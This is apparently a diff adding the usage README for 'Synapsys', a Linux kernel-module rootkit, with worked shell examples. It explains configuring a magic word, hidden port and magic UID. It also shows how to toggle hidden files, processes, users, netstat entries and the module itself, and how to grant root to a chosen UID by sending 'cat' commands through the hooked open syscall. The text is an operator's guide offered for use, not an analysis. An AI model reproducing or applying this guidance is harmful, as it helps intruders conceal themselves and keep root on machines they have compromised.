@@ -1,0 +1,123 @@
+This should be an explanation text, I hope you could understand my poor english.
+
+BEFORE INSERTION
+Before the insertion of this module it's better to look at the source and make some modifies:
+
+- Change the magic word, you'd better choose your own magic word, choose a rare word
+that you think nobody will write;
+- Change the defined HIDDEN_PORT and the MAGIC_UID now if you want because you can't change
+it after the module insertion;
+- Other things like file2hide (the hidden file prefix) , hiddenuser or netstatstuff (word
+that is present in the line of netstat output you want to hide e. ip, host, protocol, port 
+etc) can be modified after module insertion.
+
+CONTROL THE LKM VIA OPEN SYSCALL
+
+via open syscall you can :
+- Activate and deactivate every feature : root privileges to MAGIC_UID, file/process hiding,
+netstat hiding, user hiding;
+- Uninstall the lkm( instead of this you'd better user rmmod Synapsys, even if the lkm is hidden in
+query module you can remove it with rmmod);
+- Print the value of variables that activate/deactivate every feature and other variables that they
+use (file2hide, netstatstuff, hiddenuser);
+- Modify the value of variable like file2hide, netstatstuff and hiddenuser.
+
+FEATURES 
+
+- File hiding : all the files and directories which contain the string file2hide[] in their name are hidden;
+- Process hiding : with kill -32 <pid> you assign the flag PF_INVISIBLE to a process that will be hidden, 
+his child and clone too;
+- User hiding : all users which contain the string hiddenuser[] in their name are hidden in finger, who and
+w;
+- Root privileges : if the user uid is the MAGIC_UID the user will have root privileges;
+- Netstat hiding : all the lines in netstat's output which contain the string HIDDEN_PORT or the string 
+netstatstuff[] are hidden;
+- Module hiding : if the module name is LKM_NAME the module is hidden (but you can remove it with rmmod).
+
+
+EXAMPLES
+
+to explain better how to use this lkm I'll give you some examples for function hard to explain in other way :
+- Open syscall : ( I'll use for these examples cat to call open syscall and the magicword traboz)
+  - activate/deactive and print value of variable (default : active)
+      - cat <magicword><cmd>[arg] 
+      cmd list : 
+	muid : activate/deactivate root privileges to MAGIC_UID
+	hidf : activate/deactivate file/process hiding [ has arg ] : you can pass the file prefix to hide
+	unin : unload module calling cleanup_module() you'd better use rmmod Synapsys instead of this
+	hidn : active/deactivate nestat hiding [ has arg ] : you can pass it things to hide in netstat 
+	hidu : activate/deactive user hiding (finger/who/w) [ has arg ] : you can pass it the user
+	hidm : activate/deactvate lkm hiding  	
+
+    - example for root privileges, (deactivation/activation it's the same with all the others cat <magicword><cmd>): 
+      Ncl@Berserker:~$ cat trabozmuidverbose
+      the value of uid_func is : 1
+      cat: trabozmuidverbose: No such file or directory
+      the value now is 1 so the feature is active
+
+      Ncl@Berserker:~$ cat trabozmuid
+      cat: trabozmuid: No such file or directory
+      i changed the value, the feature is inactive, i'll verify it 
+
+      Ncl@Berserker:~$ cat trabozmuidverbose
+      the value of uid_func is : 0
+      cat: trabozmuidverbose: No such file or directory
+      now with another cat trabozmuid the feature will be activated
+
+    - file/process hiding :
+      change magicprefix for files 
+       Ncl@Berserker:~$ cat trabozhidfverbose
+       the value of hidf_func is : 1 the hidden files prefix is : NCL_ph1l3
+        cat: trabozhidfverbose: No such file or directory
+      now I'll change the value 
+
+      Ncl@Berserker:~$ cat trabozhidfl33t
+       cat: trabohidfl33t: No such file or directory
+      now verify 
+
+      Ncl@Berserker:~$ cat trabozhidfverbose
+      the value of hidf_func is : 1 the hidden files prefix is : l33t
+       cat: trabozhidfverbose: No such file or directory
+   
+   - netstat hiding :
+      change things hidden in netstat 
+      Ncl@Berserker:~$ cat trabozhidnverbose
+      the value of nets_func is : 1 the hidden port is: 3012 are hidden lines that contains host_or_ip_or_port too
+       cat: trabozhidnverbose: No such file or directory
+       3012 is defined you've to change in the source before insmod host_or_ip_or_port can be modified now
+
+       Ncl@Berserker:~$ cat trabozhidn212.32.225.213
+       cat: trabozhidn212.32.225.213: No such file or directory
+       now verify
+
+       Ncl@Berserker:~$ cat trabozhidnverbose
+       the value of nets_func is : 1 the hidden port is: 3012 are hidden lines that contains 212.32.225.213 too
+       cat: trabozhidnverbose: No such file or directory
+       now all lines that contains 212.32.225.213 are hidden
+
+       with this feature you can hide ip host port protocols and everything you want
+
+   - user hiding :
+     change hidden user 
+     Ncl@Berserker:~$ cat trabozhiduverbose 
+     the value of hidu_func is : 1 the hidden user is Ncl 
+     cat: trabozhiduverbose: No such file or directory
+ 
+     Ncl@Berserker:~$ cat trabozhidur00t
+     cat: trabozhidur00t: No such file or directory
+     the hidden user is now r00t
+
+     Ncl@Berserker:~$ cat trabozhiduverbose
+     the value of hidu_func is : 1 the hidden user is r00t
+     cat: trabozhiduverbose: No such file or directory
+
+   - uninstal lkm :
+     Ncl@Berserker:~$ cat trabozunin
+     unistalling Synapsys
+     cat: trabozunin: No such file or directory
+
+
+
+
+                                          for questions, suggestions, bugs report ---> berserker.ncl@infinito.it
+
